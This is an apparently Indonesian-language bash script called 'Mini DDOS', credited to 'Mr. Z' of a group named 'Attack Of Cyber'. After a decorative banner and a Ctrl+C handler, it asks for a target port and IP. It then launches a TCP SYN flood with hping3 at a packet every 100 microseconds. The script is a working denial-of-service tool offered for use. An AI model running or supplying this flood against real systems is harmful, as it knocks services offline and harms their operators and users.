#!/bin/bash
#version 1.0

# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Mini DDOS | lolcat

echo -e  "_____________________________________________________________"
echo -e  "Tools    : Mini DDOS $white         " |lolcat
echo -e  "Creadby  : Mr. Z $white   " |lolcat
echo -e  "Contact  : attackofcyber969@gmail.com $white " |lolcat
echo -e  "Team     : Attack Of Cyber " | lolcat
echo -e  "_____________________________________________________________"

###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
echo -e $cyan"[#]> Thanks"
sleep 1
echo -e $white"[#]> see you gaes :)..."
sleep 1
exit
}

echo "Masukkan Port target anda : "
read a
echo "Masukkan IP target anda : "
read b
echo "Tunggu....."
sleep 1
echo "Proses DDOS IP $a sedang berjalan..."
sleep 1
hping3 -i u100 -S -p $a $b
